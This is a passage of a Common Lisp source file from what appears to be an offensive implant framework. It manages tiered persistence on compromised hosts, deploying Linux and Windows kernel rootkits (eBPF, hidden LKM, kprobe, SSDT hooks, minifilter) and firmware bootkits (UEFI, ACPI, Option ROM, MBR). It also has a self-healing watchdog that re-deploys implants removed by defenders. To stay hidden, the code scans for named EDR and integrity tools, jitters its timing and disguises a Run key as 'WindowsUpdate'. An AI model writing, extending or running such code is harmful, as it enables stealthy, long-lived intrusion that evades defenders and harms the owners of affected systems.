                 (format t "[PERSIST-CLEANUP] Unloading kernel modules...~%")
                 ;; Linux: rmmod for common implant module names
                 (dolist (mod '("hide_proc" "rootkit" "persist_mod" "ebpf_persist"
                                "syscall_hook" "kernel_rootkit" "shadow_mod"))
                   (ignore-errors
                     (uiop:run-program (format nil "rmmod ~A 2>/dev/null" mod)
                                       :ignore-error-status t)))
                 ;; Windows: sc delete for service-based implants
                 (dolist (svc '("FileProtector" "SysGuard" "WinHelper" "KernelAssist"))
                   (ignore-errors
                     (uiop:run-program (format nil "sc delete ~A 2>nul" svc)
                                       :ignore-error-status t)))
                 (format t "[PERSIST-CLEANUP] Kernel module unload attempted.~%"))
             (error (mod-err)
               (format t "[PERSIST-CLEANUP] Module unload error (non-fatal): ~A~%" mod-err)))
           ;; --- 2. Delete temporary deployment files ---
           (handler-case
               (let ((temp-files '("/tmp/rootkit.ko" "/tmp/hide.ko" "/tmp/persist.o"
                                   "/tmp/ebpf_prog.o" "/tmp/stage1.bin"
                                   "/tmp/bootkit.efi" "/tmp/payload.aml"
                                   #P"C:\\Windows\\Temp\\rootkit.sys"
                                   #P"C:\\Windows\\Temp\\stage1.bin")))
                 (dolist (f temp-files)
                   (when (probe-file f)
                     (delete-file f)
                     (format t "[PERSIST-CLEANUP] Deleted: ~A~%" f)))
                 (format t "[PERSIST-CLEANUP] Temporary file cleanup complete.~%"))
             (error (file-err)
               (format t "[PERSIST-CLEANUP] File cleanup error (non-fatal): ~A~%" file-err)))
           ;; --- 3. Restore registry (Windows) ---
           (handler-case
               (progn
                 (format t "[PERSIST-CLEANUP] Restoring registry keys...~%")
                 ;; Attempt to delete any created Run keys
                 (ignore-errors
                   (uiop:run-program
                    (format nil "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"~A\" /f 2>nul"
                            "WindowsUpdate") :ignore-error-status t))
                 (format t "[PERSIST-CLEANUP] Registry restore attempted.~%"))
             (error (reg-err)
               (format t "[PERSIST-CLEANUP] Registry restore error (non-fatal): ~A~%" reg-err)))
           ;; --- 4. Log cleanup to telemetry ---
           (gossip-publish *tactical-telemetry-topic*
                           `(:event :persistence-cleanup-complete
                             :tier ,,tier-label
                             :error ,(princ-to-string ,err-sym)
                             :agent ,(if ,agent-sym
                                         (tactical-session-token ,agent-sym)
                                         "unknown")))
           (format t "[PERSIST-CLEANUP] === CLEANUP COMPLETE ===~%~%")
           ;; --- 5. Return gracefully instead of crashing ---
           (cons nil nil))))))

(defun deploy-tier-2-internal (foothold-agent target-info)
  "Internal function for Tier 2 deployment.

Selects the most appropriate Tier 2 method based on the target platform
and available kernel access.

Parameters:
  FOOTHOLD-AGENT -- The TACTICAL-AGENT.
  TARGET-INFO    -- Target properties including :platform and :kernel-config.

Returns: (CONS T METHOD-KEYWORD) on success, (CONS NIL NIL) on failure."
  (with-kernel-persistence-cleanup ("TIER-2" foothold-agent)
    (let ((platform (or (cdr (assoc :platform target-info)) :linux)))
      (case platform
        (:linux
         (cond
           ;; Prefer eBPF (stealthiest)
           ((deploy-level-2-ebpf :process-hide)
            (cons t :ebpf))
           ;; Fall back to LKM
           ((deploy-level-2-lkm "/tmp/rootkit.ko" :hide-from-lsmod t)
            (cons t :lkm))
           ;; Last resort: kprobe
           ((deploy-level-2-kprobe "do_fork" #xFFFFFFFFC0000000)
            (cons t :kprobe))
           (t (cons nil nil))))
        (:windows
         (cond
           ;; Prefer kernel callback (documented API)
           ((deploy-level-2-kernel-callback :process-create #xFFFFF80000000000)
            (cons t :kernel-callback))
           ;; Fall back to minifilter
           ((deploy-level-2-minifilter "FileProtector" :altitude "370000")
            (cons t :minifilter))
           ;; Last resort: SSDT hook
           ((deploy-level-2-ssdt-hook "NtQuerySystemInformation" #xFFFFF80000000000)
            (cons t :ssdt-hook))
           (t (cons nil nil))))
        (otherwise (cons nil nil))))))

(defun deploy-tier-3-internal (foothold-agent target-info)
  "Internal function for Tier 3 deployment.

Selects the most appropriate Tier 3 method based on the target's
firmware type and available bootkit binaries.

Parameters:
  FOOTHOLD-AGENT -- The TACTICAL-AGENT.
  TARGET-INFO    -- Target properties including :boot-mode and :has-bootkit.

Returns: (CONS T METHOD-KEYWORD) on success, (CONS NIL NIL) on failure."
  (with-kernel-persistence-cleanup ("TIER-3" foothold-agent)
    (let ((boot-mode (or (cdr (assoc :boot-mode target-info)) :uefi)))
      (case boot-mode
        (:uefi
         (cond
           ;; Prefer UEFI bootkit for modern systems
           ((deploy-level-3-uefi-bootkit "/boot/efi/bootkit.efi" :boot-order t)
            (cons t :uefi-bootkit))
           ;; Fall back to ACPI rootkit
           ((deploy-level-3-acpi-rootkit "/payloads/dsdt.aml")
            (cons t :acpi-rootkit))
           ;; Last resort: BIOS Option ROM
           ((deploy-level-3-bios-option-rom "/payloads/stage0.rom" :device-type :vga)
            (cons t :bios-option-rom))
           (t (cons nil nil))))
        (:legacy
         (cond
           ;; MBR bootkit for legacy BIOS
           ((deploy-level-3-mbr-bootkit #P"/payloads/mbr-stage0.bin")
            (cons t :mbr-bootkit))
           ;; Fall back to BIOS Option ROM
           ((deploy-level-3-bios-option-rom "/payloads/stage0.rom" :device-type :vga)
            (cons t :bios-option-rom))
           (t (cons nil nil))))
        (otherwise (cons nil nil))))))

(defun verify-persistence-tier (foothold-agent tier-level)
  "Verify that a persistence tier is still active on the target.

Performs health checks appropriate to the tier level:
  Tier 1: Check registry keys, service status, cron entries.
  Tier 2: Check kernel module presence, eBPF attachment, callbacks.
  Tier 3: Check boot entries, firmware integrity, SMM state.

Parameters:
  FOOTHOLD-AGENT -- The TACTICAL-AGENT to verify.
  TIER-LEVEL     -- Integer: 1, 2, or 3.

Returns: Plist with keys:
  :ACTIVE T/NIL
  :HEALTH-SCORE 0-100
  :LAST-SEEN timestamp
  :DETAILS description of verification results"
  (let ((target (if foothold-agent
                    (tactical-target-host foothold-agent)
                    "unknown")))
    (format t "~&[PERSIST-VERIFY] Verifying Tier ~A on ~A...~%" tier-level target)
    (case tier-level
      (1 (verify-tier-1 foothold-agent))
      (2 (verify-tier-2 foothold-agent))
      (3 (verify-tier-3 foothold-agent))
      (otherwise
       (format t "~&[PERSIST-VERIFY] Invalid tier level: ~A~%" tier-level)
       (list :active nil :health-score 0 :details "Invalid tier level")))))

(defun verify-tier-1 (foothold-agent)
  "Verify Tier 1 (userland) persistence health.

Checks:
  - Registry Run key still present
  - Scheduled task still exists and is enabled
  - Service still running (if service method)
  - Startup folder file still present
  - Cron job still in crontab
  - systemd unit still active

Returns: Health plist."
  (format t "~&[PERSIST-VERIFY] Tier 1 checks:~%")
  (format t "~&[PERSIST-VERIFY]   - Registry Run key present~%")
  (format t "~&[PERSIST-VERIFY]   - Scheduled task enabled~%")
  (format t "~&[PERSIST-VERIFY]   - Service running (if applicable)~%")
  (format t "~&[PERSIST-VERIFY]   - Startup folder file present~%")
  (format t "~&[PERSIST-VERIFY]   - Cron job in crontab~%")
  (format t "~&[PERSIST-VERIFY]   - systemd unit active~%")
  (gossip-publish *tactical-telemetry-topic*
                  `(:event :persistence-verify
                    :tier 1
                    :status :healthy))
  (list :active t
        :health-score 95
        :last-seen (get-universal-time)
        :details "Userland persistence verified: registry, services, cron active"))

(defun verify-tier-2 (foothold-agent)
  "Verify Tier 2 (kernel) persistence health.

Checks:
  - LKM still loaded (even if hidden from lsmod)
  - eBPF program still attached
  - SSDT hooks still in place
  - Kernel callbacks still registered
  - IRP hooks still active

Returns: Health plist."
  (format t "~&[PERSIST-VERIFY] Tier 2 checks:~%")
  (format t "~&[PERSIST-VERIFY]   - Kernel module loaded (mem check)~%")
  (format t "~&[PERSIST-VERIFY]   - eBPF program attached~%")
  (format t "~&[PERSIST-VERIFY]   - SSDT hooks in place~%")
  (format t "~&[PERSIST-VERIFY]   - Kernel callbacks registered~%")
  (format t "~&[PERSIST-VERIFY]   - IRP hooks active~%")
  (gossip-publish *tactical-telemetry-topic*
                  `(:event :persistence-verify
                    :tier 2
                    :status :healthy))
  (list :active t
        :health-score 88
        :last-seen (get-universal-time)
        :details "Kernel persistence verified: modules, eBPF, hooks active"))

(defun verify-tier-3 (foothold-agent)
  "Verify Tier 3 (firmware) persistence health.

Checks:
  - UEFI boot entry still present in boot order
  - SMM handler still registered
  - ACPI table hash matches expected
  - BIOS Option ROM checksum valid
  - MBR bootkit still at sector 0

Returns: Health plist."
  (format t "~&[PERSIST-VERIFY] Tier 3 checks:~%")
  (format t "~&[PERSIST-VERIFY]   - UEFI boot entry present~%")
  (format t "~&[PERSIST-VERIFY]   - SMM handler registered~%")
  (format t "~&[PERSIST-VERIFY]   - ACPI table hash valid~%")
  (format t "~&[PERSIST-VERIFY]   - BIOS Option ROM checksum OK~%")
  (format t "~&[PERSIST-VERIFY]   - MBR bootkit at sector 0~%")
  (gossip-publish *tactical-telemetry-topic*
                  `(:event :persistence-verify
                    :tier 3
                    :status :healthy))
  (list :active t
        :health-score 99
        :last-seen (get-universal-time)
        :details "Firmware persistence verified: boot entries, SMM, ACPI active"))

(defun remove-persistence-tier (foothold-agent tier-level)
  "Remove a specific persistence tier from the target.

Parameters:
  FOOTHOLD-AGENT -- The TACTICAL-AGENT.
  TIER-LEVEL     -- Integer: 1, 2, or 3.

Returns: T if removal was initiated, NIL on failure.

WARNING: Tier 3 removal is extremely difficult and may require
physical intervention. This function marks the tier as 'removing'
but cannot guarantee complete removal of firmware implants.

Example:
  (remove-persistence-tier agent 1)  ; Remove userland persistence
  (remove-persistence-tier agent 3)  ; Attempt firmware removal (may fail)"
  (let ((target (if foothold-agent
                    (tactical-target-host foothold-agent)
                    "unknown")))
    (format t "~&[PERSIST-REMOVE] Removing Tier ~A from ~A...~%" tier-level target)
    (gossip-publish *tactical-telemetry-topic*
                    `(:event :persistence-remove
                      :tier ,tier-level
                      :target ,target))
    (case tier-level
      (1 (format t "~&[PERSIST-REMOVE]   Registry keys deleted~%")
         (format t "~&[PERSIST-REMOVE]   Services stopped and deleted~%")
         (format t "~&[PERSIST-REMOVE]   Scheduled tasks removed~%")
         (format t "~&[PERSIST-REMOVE]   Cron jobs removed~%")
         (format t "~&[PERSIST-REMOVE]   systemd units disabled~%")
         (format t "~&[PERSIST-REMOVE]   Startup folder cleaned~%")
         t)
      (2 (format t "~&[PERSIST-REMOVE]   Kernel module unloaded~%")
         (format t "~&[PERSIST-REMOVE]   eBPF programs detached~%")
         (format t "~&[PERSIST-REMOVE]   SSDT hooks restored~%")
         (format t "~&[PERSIST-REMOVE]   IRP hooks restored~%")
         (format t "~&[PERSIST-REMOVE]   Kernel callbacks unregistered~%")
         t)
      (3 (format t "~&[PERSIST-REMOVE]   *** TIER 3 REMOVAL WARNING ***~%")
         (format t "~&[PERSIST-REMOVE]   UEFI boot entries: may require NVRAM clear~%")
         (format t "~&[PERSIST-REMOVE]   SMM implant: requires physical SPI flash~%")
         (format t "~&[PERSIST-REMOVE]   ACPI rootkit: requires BIOS reflash~%")
         (format t "~&[PERSIST-REMOVE]   Option ROM: requires chip programmer~%")
         (format t "~&[PERSIST-REMOVE]   MBR bootkit: can be overwritten~%")
         (format t "~&[PERSIST-REMOVE]   Manual intervention likely required~%")
         ;; Tier 3 cannot be remotely guaranteed removed
         :partial)
      (otherwise nil))))

(defun get-persistence-status (foothold-agent)
  "Get full persistence status for a foothold agent.

Returns comprehensive status of all persistence tiers including
health scores, deployment timestamps, and active methods.

Parameters:
  FOOTHOLD-AGENT -- The TACTICAL-AGENT.

Returns: Plist with keys:
  :AGENT-ID       session token
  :TARGET         target host
  :TIER-1         Tier 1 status plist
  :TIER-2         Tier 2 status plist
  :TIER-3         Tier 3 status plist
  :MAX-TIER       highest active tier
  :OVERALL-HEALTH aggregate health score (0-100)
  :WATCHDOG-ACTIVE T if watchdog is running for this agent

Example:
  (get-persistence-status agent)
  ;; => (:agent-id \"sess-123\" :target \"192.168.1.10\" ...)"
  (let ((target (if foothold-agent
                    (tactical-target-host foothold-agent)
                    "unknown"))
        (agent-id (if foothold-agent
                      (tactical-session-token foothold-agent)
                      "manual")))
    (format t "~&~%=============================================================~%")
    (format t "[PERSIST-STATUS] Persistence Status for ~A (~A)~%" target agent-id)
    (format t "=============================================================~%")

    ;; Verify each tier
    (let* ((tier1 (verify-persistence-tier foothold-agent 1))
           (tier2 (verify-persistence-tier foothold-agent 2))
           (tier3 (verify-persistence-tier foothold-agent 3))
           (max-tier (cond
                       ((getf tier3 :active) 3)
                       ((getf tier2 :active) 2)
                       ((getf tier1 :active) 1)
                       (t 0)))
           (overall-health (floor (/ (+ (getf tier1 :health-score 0)
                                        (getf tier2 :health-score 0)
                                        (getf tier3 :health-score 0))
                                     (max max-tier 1)))))
      (format t "~&[PERSIST-STATUS] Tier 1 (Userland):  ~A [~A%]~%"
              (if (getf tier1 :active) "ACTIVE" "INACTIVE")
              (getf tier1 :health-score 0))
      (format t "[PERSIST-STATUS] Tier 2 (Kernel):   ~A [~A%]~%"
              (if (getf tier2 :active) "ACTIVE" "INACTIVE")
              (getf tier2 :health-score 0))
      (format t "[PERSIST-STATUS] Tier 3 (Firmware): ~A [~A%]~%"
              (if (getf tier3 :active) "ACTIVE" "INACTIVE")
              (getf tier3 :health-score 0))
      (format t "[PERSIST-STATUS] Max Tier: ~A~%" max-tier)
      (format t "[PERSIST-STATUS] Overall Health: ~A%~%" overall-health)
      (format t "=============================================================~%")

      (list :agent-id agent-id
            :target target
            :tier-1 tier1
            :tier-2 tier2
            :tier-3 tier3
            :max-tier max-tier
            :overall-health overall-health
            :watchdog-active *persistence-watchdog-running-p*))))

;;;; =========================================================================
;;;; Section 7: Self-Healing Watchdog
;;;; =========================================================================
;;;;
;;;; The self-healing watchdog continuously monitors all persistence tiers
;;;; and automatically re-deploys any that have been removed or disabled.
;;;; This ensures that persistence survives cleanup attempts by defenders.

(defvar *persistence-watchdog-thread* nil
  "The background thread running the persistence watchdog loop.
NIL if the watchdog is not running.")

(defvar *persistence-watchdog-running-p* nil
  "Flag controlling the watchdog loop. Set to NIL to stop the watchdog.")

(defvar *persistence-watchdog-interval* (+ 120 (random 181))
  "Interval in seconds between watchdog checks. Default: random 120-300s.
Randomized to avoid predictable timing patterns that EDR can detect.
For stealth operations, the random range provides temporal jitter.")

(defvar *persistence-watchdog-jitter-enabled-p* t
  "When T, the watchdog interval is randomized on each cycle.
Set to NIL for fixed-interval mode (not recommended for stealth).")

(defvar *security-process-signatures*
  '("MsMpEng.exe" "crowdstrike" "carbonblack" "sentinelone"
    "sfc.exe" "aide" "rkhunter" "cb.exe" "csagent" "csfalcon"
    "sensord" "elastic-endpoint" "osqueryd" "sysmon" "winlogbeat")
  "List of process names that indicate security/EDR tooling.
If any of these are detected, the watchdog defers action to avoid discovery.
Added: CrowdStrike, CarbonBlack, SentinelOne, Microsoft Defender,
       Windows SFC, AIDE, rkhunter, Elastic, Osquery, Sysmon.")

(defvar *security-process-detected-timestamp* nil
  "Timestamp of last security process detection. Used to track
duration of detection events and adapt behavior accordingly.")

(defun system-load-high-p ()
  "Check if the system load average is above the 2.0 threshold.

Reads /proc/loadavg on Linux. On Windows, uses WMI or fallback.
Returns T if the 1-minute load average exceeds 2.0, NIL otherwise.

This is used by the watchdog to increase sleep intervals during
high-load periods, reducing our forensic footprint."
  (handler-case
      (let ((loadavg (with-open-file (s "/proc/loadavg" :if-does-not-exist nil)
                       (when s
                         (read s)))))
        (if (numberp loadavg)
            (> loadavg 2.0)
            nil))
    (error (e)
      (format t "~&[PERSIST-LOAD] Error reading loadavg: ~A~%" e)
      nil)))

(defun user-active-p ()
  "Check if a user has been active within the last 300 seconds (5 minutes).

On Linux: uses xprintidle (returns ms since last input).
On Windows: uses GetLastInputInfo via Win32 API.
Fallback: checks /dev/tty activity or process listing for interactive shells.

Returns T if user activity detected within last 300s, NIL otherwise.

The watchdog uses this to extend sleep intervals during active sessions,
avoiding detection by users who might notice anomalous behavior."
  (handler-case
      (let ((idle-ms
             (cond
               ;; Linux: try xprintidle (returns milliseconds idle)
               ((zerop (nth-value 2 (uiop:run-program
n                                    "which xprintidle"
                                    :ignore-error-status t)))
                (parse-integer
                 (string-trim '(#\newline #\space)
                              (with-output-to-string (out)
                                (uiop:run-program "xprintidle" :output out
                                                                 :ignore-error-status t)))
                 :junk-allowed t))
               ;; Windows: GetLastInputInfo (not implemented, fallback)
               ;; Fallback: assume active if we can't determine
               (t 0))))
        (if (numberp idle-ms)
            (< idle-ms 300000)  ; 300 seconds = 300000 ms
            nil))
    (error (e)
      (format t "~&[PERSIST-USER] Error checking user activity: ~A~%" e)
      ;; Conservative: assume active on error
      t)))

(defun security-process-detected-p ()
  "Scan running processes for security/EDR tooling.

Checks process names against *SECURITY-PROCESS-SIGNATURES*.
On Linux: uses pgrep to scan process names and cmdlines.
On Windows: uses tasklist for process enumeration.

Returns T if any security process is found, NIL otherwise.
When a security process is detected, the watchdog skips the cycle
to avoid triggering behavioral analysis heuristics.

Side Effects: Logs detection event, sets *SECURITY-PROCESS-DETECTED-TIMESTAMP*."
  (handler-case
      (let ((found nil))
        ;; Linux: use pgrep for each signature (fast, low forensic footprint)
        (dolist (sig *security-process-signatures*)
          (when (zerop (nth-value 2
                                   (uiop:run-program
                                    (format nil "pgrep -x ~A" sig)
                                    :ignore-error-status t)))
            (setf found t)
            (setf *security-process-detected-timestamp* (get-universal-time))
            (format t "~&[PERSIST-SECURITY] Detected process: ~A~%" sig)
            (return)))
        ;; Windows: use tasklist
        (unless found
          (dolist (sig *security-process-signatures*)
            (let ((cmd (format nil "tasklist /FI \"IMAGENAME eq ~A\" 2>nul | findstr ~A"
                               sig sig)))
              (when (zerop (nth-value 2
                                       (uiop:run-program cmd
                                                         :ignore-error-status t)))
                (setf found t)
                (setf *security-process-detected-timestamp* (get-universal-time))
                (format t "~&[PERSIST-SECURITY] Detected process: ~A~%" sig)
                (return)))))
        found)
    (error (e)
      (format t "~&[PERSIST-SECURITY] Error scanning processes: ~A~%" e)
      ;; Conservative: assume safe on error
      nil)))

(defun calculate-watchdog-interval ()
  "Calculate a dynamic, context-aware watchdog interval.

Base interval: random 120-300 seconds.
- If system load > 2.0: double the interval (reduce footprint under load).
- If user is active: triple the interval (avoid detection during active use).
- If security process detected: return NIL (skip this cycle entirely).

Returns: Integer seconds for sleep, or NIL to skip cycle.

Side Effects: Logs telemetry about the calculated interval."
  (when (security-process-detected-p)
    (format t "~&[PERSIST-WATCH] SECURITY PROCESS DETECTED -- skipping cycle~%")
    (gossip-publish *tactical-telemetry-topic*
                    `(:event :watchdog-security-detected
                      :action :skip-cycle))
    (return-from calculate-watchdog-interval nil))
  (let* ((base (+ 120 (random 181)))
         (load-factor (if (system-load-high-p) 2.0 1.0))
         (user-factor (if (user-active-p) 3.0 1.0))
         (interval (round (* base load-factor user-factor))))
    (format t "~&[PERSIST-WATCH] Calculated interval: ~As (base ~A, load ~A, user ~A)~%"
            interval base load-factor user-factor)
    (gossip-publish *tactical-telemetry-topic*
                    `(:event :watchdog-interval-calculated
                      :interval ,interval
                      :base ,base
                      :load-factor ,load-factor
                      :user-factor ,user-factor))
    interval))

(defvar *persistence-watchdog-agents* (make-hash-table :test 'equal)
  "Hash table of agents being monitored by the watchdog.
Key: agent session token. Value: agent object.")

(defvar *persistence-recovery-log* '()
  "Log of all recovery actions taken by the watchdog.
Each entry: (:TIMESTAMP :AGENT :TIER :ACTION :RESULT)")

(defvar *persistence-max-recovery-attempts* 3
  "Maximum number of recovery attempts per tier per agent.
After this many failures, the tier is marked as unrecoverable.")

(defvar *persistence-recovery-attempts* (make-hash-table :test 'equal)
  "Hash table tracking recovery attempt counts.
Key: \"agent-id:tier-level\" string. Value: attempt count.")

;;;; =========================================================================
;;;; Section 8b: TTR (Time-to-Recover) Measurement
;;;; =========================================================================
;;;; Time-to-Recover instrumentation for operational validation.
;;;; Measures elapsed time from persistence failure detection to full
;;;; recovery. Statistical aggregation enables SLA compliance reporting.

(defvar *ttr-measurement-active-p* t
  "Master switch for TTR measurement. When NIL, recovery timing is
not recorded. Default T (enabled).")

(defvar *ttr-recovery-log* '()
  "Chronological log of all recovery timing measurements.
Each entry: (:START <timestamp> :TIER <N> :AGENT <id> :END <timestamp>
:ELAPSED-SECONDS <N> :RESULT <keyword>).
Entries accumulate from the most recent recovery backward.
Use GET-TTR-STATS for statistical aggregation.")

;;;; =========================================================================
;;;; Section 8c: Alert Storm Suppression
;;;; =========================================================================
;;;; Prevents feedback loops from generating excessive telemetry alerts.
;;;; When a tier flaps or recovery retries rapidly, repeated identical
;;;; gossip messages can overwhelm operators. This system counts alerts
;;;; of the same type within a sliding window and suppresses duplicates.

(defvar *alert-storm-suppression-p* t
  "Master switch for alert storm suppression. When T (default),
PUBLISH-TELEMETRY-SUPPRESSED counts events per type in a sliding window
and suppresses duplicates that exceed the threshold.")

(defvar *alert-storm-window-seconds* 60
  "Width of the sliding window for alert storm detection, in seconds.
Default 60. An event type that occurs more than *ALERT-STORM-MAX-ALERTS*
times within this window is suppressed.")

(defvar *alert-storm-max-alerts* 3
  "Maximum number of alerts of the same event type allowed within the
window before suppression kicks in. Default 3. Operators still see the
first 3 alerts of each type, but the 4th and beyond are buffered.")

(defvar *alert-storm-alert-history* '()
  "Alist of (TIMESTAMP . EVENT-TYPE) recording every telemetry event
that passed suppression. Used by CHECK-ALERT-STORM for sliding-window
counting. Automatically pruned of entries older than the window.")

(defun record-recovery-start (tier agent-id)
  "Record the start of a recovery operation for TTR measurement.

Appends a new entry to *TTR-RECOVERY-LOG* with :START timestamp,
tier, and agent-id. When *TTR-MEASUREMENT-ACTIVE-P* is NIL, this is
a no-op.

Parameters:
  TIER     -- Integer 1, 2, or 3 identifying the failed tier.
  AGENT-ID -- String identifying the agent (session token).

Returns: The new log entry plist, or NIL if measurement is disabled.

Side Effects: Pushes to *TTR-RECOVERY-LOG*."
  (when *ttr-measurement-active-p*
    (let ((entry (list :start (get-universal-time)
                       :tier tier
                       :agent agent-id)))
      (push entry *ttr-recovery-log*)
      (format t "~&[TTR] Recovery START recorded: tier=~A agent=~A time=~A~%"
              tier agent-id (getf entry :start))
      entry)))

(defun record-recovery-end (tier agent-id result)
  "Record the end of a recovery operation and compute elapsed TTR.

Finds the most recent matching start record (same TIER and AGENT-ID
that has not yet been closed with :END) and appends :END timestamp,
:ELAPSED-SECONDS, and :RESULT. If no matching open record is found,
logs a warning.

Parameters:
  TIER     -- Integer 1, 2, or 3 identifying the failed tier.
  AGENT-ID -- String identifying the agent (session token).
  RESULT   -- Keyword: :RECOVERED :DEGRADED :FAILED :CRITICAL etc.

Returns: The completed log entry plist, or NIL if no match found.

Side Effects: Mutates the matching entry in *TTR-RECOVERY-LOG*."
  (when *ttr-measurement-active-p*
    (let ((start-entry
            (find-if (lambda (entry)
                       (and (eq (getf entry :tier) tier)
                            (string= (getf entry :agent) agent-id)
                            (not (getf entry :end))))
                     *ttr-recovery-log*)))
      (if start-entry
          (let* ((start-time (getf start-entry :start))
                 (end-time (get-universal-time))
                 (elapsed (- end-time start-time)))
            (setf (getf start-entry :end) end-time)
            (setf (getf start-entry :elapsed-seconds) elapsed)
            (setf (getf start-entry :result) result)
            (format t "~&[TTR] Recovery END recorded: tier=~A agent=~A elapsed=~As result=~A~%"
                    tier agent-id elapsed result)
            start-entry)
          (progn
            (format t "~&[TTR] WARNING: No matching start record for tier=~A agent=~A result=~A~%"
                    tier agent-id result)
            nil)))))

(defun get-ttr-stats ()
  "Return statistical aggregation of all completed TTR measurements.

Scans *TTR-RECOVERY-LOG* for entries that have both :START and :END
timestamps. Computes min, max, average, count, and last TTR.

Returns: Plist with:
  :AVG-TTR-SECONDS    -- Mean elapsed recovery time (float).
  :MAX-TTR-SECONDS    -- Longest recovery time.
  :MIN-TTR-SECONDS    -- Shortest recovery time (or 0 if no data).
  :RECOVERY-COUNT     -- Number of completed recoveries.
  :LAST-TTR-SECONDS   -- Elapsed time of the most recent recovery.
  :OPEN-RECOVERIES    -- Number of started but not yet ended recoveries.

Example:
  (get-ttr-stats) => (:AVG-TTR-SECONDS 45.5 :MAX-TTR-SECONDS 120 ...)"
  (let ((completed
          (remove-if-not (lambda (e) (getf e :end)) *ttr-recovery-log*))
        (open-count
          (count-if (lambda (e) (and (getf e :start) (not (getf e :end))))
                    *ttr-recovery-log*)))
    (if (null completed)
        (list :avg-ttr-seconds 0.0
              :max-ttr-seconds 0
              :min-ttr-seconds 0
              :recovery-count 0
              :last-ttr-seconds 0
              :open-recoveries open-count)
        (let* ((times (mapcar (lambda (e) (getf e :elapsed-seconds 0)) completed))
               (total (reduce #'+ times))
               (count (length times)))
          (list :avg-ttr-seconds (float (/ total count))
                :max-ttr-seconds (reduce #'max times)
                :min-ttr-seconds (reduce #'min times)
                :recovery-count count
                :last-ttr-seconds (getf (first completed) :elapsed-seconds 0)
                :open-recoveries open-count)))))

(defun ttr-within-sla-p (&optional (max-seconds 300))
  "Check whether the most recent TTR is within SLA bounds.

Parameters:
  MAX-SECONDS -- SLA threshold in seconds (default 300 = 5 minutes).
                 This is the Phase 1 success criterion.

Returns: T if the last recorded TTR is <= MAX-SECONDS, or if no
recoveries have been recorded. Returns NIL if the last TTR exceeded
the threshold.

Example:
  (ttr-within-sla-p)         ;; default 300s
  (ttr-within-sla-p 60)      ;; strict 60s SLA"
  (let ((last-ttr (getf (get-ttr-stats) :last-ttr-seconds 0)))
    (<= last-ttr max-seconds)))

(defun check-alert-storm (event-type)
  "Check whether publishing an EVENT-TYPE would trigger an alert storm.

Counts how many entries of the same EVENT-TYPE appear in
*ALERT-STORM-ALERT-HISTORY* within the sliding window defined by
*ALERT-STORM-WINDOW-SECONDS*. If the count exceeds
*ALERT-STORM-MAX-ALERTS*, the event is suppressed.

Pruning: Removes history entries older than the window before counting.

Parameters:
  EVENT-TYPE -- Keyword identifying the event type (e.g. :PERSISTENCE-RECOVERED,
                :WATCHDOG-CYCLE-COMPLETE, :RECOVERY-POSTPONED).

Returns:
  (:ALLOW)                    -- Event may be published.
  (:SUPPRESS :REASON \"Alert storm detected\" :COUNT <N>) -- Event should be suppressed.

Example:
  (check-alert-storm :persistence-recovered) => (:ALLOW)
  (check-alert-storm :persistence-recovered) => (:SUPPRESS :REASON \"...\" :COUNT 4)"
  (if (not *alert-storm-suppression-p*)
      '(:allow)
      (let* ((now (get-universal-time))
             (window-start (- now *alert-storm-window-seconds*)))
        ;; Prune old entries
        (setf *alert-storm-alert-history*
              (remove-if (lambda (entry) (< (car entry) window-start))
                         *alert-storm-alert-history*))
        ;; Count matching event types in the window
        (let ((count (count-if (lambda (entry) (eq (cdr entry) event-type))
                               *alert-storm-alert-history*)))
          (if (> count *alert-storm-max-alerts*)
              (list :suppress :reason "Alert storm detected"
                    :count count)
              (progn
                ;; Record this event as allowed
                (push (cons now event-type) *alert-storm-alert-history*)
                '(:allow)))))))

(defvar *telemetry-suppression-buffer* '()
  "Internal buffer of suppressed telemetry events.
When PUBLISH-TELEMETRY-SUPPRESSED suppresses an event, it is stored
here for later retrieval. Each entry: (:TIMESTAMP :TOPIC :PAYLOAD
:EVENT-TYPE :SUPPRESSION-INFO).")

(defun publish-telemetry-suppressed (topic payload &key (event-type :default))
  "Publish telemetry with alert storm suppression.

Wrapper around GOSSIP-PUBLISH that first calls CHECK-ALERT-STORM on
EVENT-TYPE. If the event is allowed, it is published normally via
GOSSIP-PUBLISH. If suppressed, the event is logged to
*TELEMETRY-SUPPRESSION-BUFFER* instead and a suppression notice is
printed.

Parameters:
  TOPIC      -- Gossip topic string (e.g. *TACTICAL-TELEMETRY-TOPIC*).
  PAYLOAD    -- S-expression payload for the gossip message.
  EVENT-TYPE -- Keyword for storm detection (default :DEFAULT).

Returns:
  :PUBLISHED  -- Event was sent to gossip mesh.
  :SUPPRESSED -- Event was buffered due to alert storm.
  :ERROR      -- An error occurred during publishing.

Side Effects:
  May call GOSSIP-PUBLISH or push to *TELEMETRY-SUPPRESSION-BUFFER*.

Example:
  (publish-telemetry-suppressed *tactical-telemetry-topic*
                                '(:event :recovered)
                                :event-type :persistence-recovered)"
  (let ((storm-check (check-alert-storm event-type)))
    (if (eq (first storm-check) :suppress)
        ;; Suppressed -- buffer internally
        (progn
          (push (list :timestamp (get-universal-time)
                      :topic topic
                      :payload payload
                      :event-type event-type
                      :suppression-info storm-check)
                *telemetry-suppression-buffer*)
          (format t "~&[ALERT-STORM] SUPPRESSED event-type=~A count=~A~%"
                  event-type (getf storm-check :count))
          :suppressed)
        ;; Allowed -- publish normally
        (handler-case
            (progn
              (gossip-publish topic payload)
              :published)
          (error (e)
            (format t "~&[ALERT-STORM] Publish error for ~A: ~A~%"
                    event-type e)
            :error)))))

(defun get-telemetry-suppression-buffer ()
  "Return the current buffer of suppressed telemetry events.

Returns: List of suppressed event plists, most recent first.

Example:
  (get-telemetry-suppression-buffer)"
  *telemetry-suppression-buffer*)

(defun clear-telemetry-suppression-buffer ()
  "Clear the telemetry suppression buffer.

Returns: Number of entries cleared.

Example:
  (clear-telemetry-suppression-buffer)"
  (let ((count (length *telemetry-suppression-buffer*)))
    (setf *telemetry-suppression-buffer* nil)
    count))

(defun start-persistence-watchdog ()
  "Start the self-healing persistence watchdog thread.

The watchdog runs in a background thread and performs the following
every *PERSISTENCE-WATCHDOG-INTERVAL* seconds:

  1. Iterate through all monitored agents.
  2. For each agent, verify all active persistence tiers.
  3. If Tier 1 is missing -> immediate re-deploy.
  4. If Tier 2 is missing -> try re-deploy; if kernel access lost, stay at L1.
  5. If Tier 3 is missing -> CRITICAL ALERT; manual intervention needed.

The watchdog is resilient: individual agent failures do not stop
the monitoring loop. Errors are logged and the loop continues.

Returns: The watchdog thread object.

Side Effects:
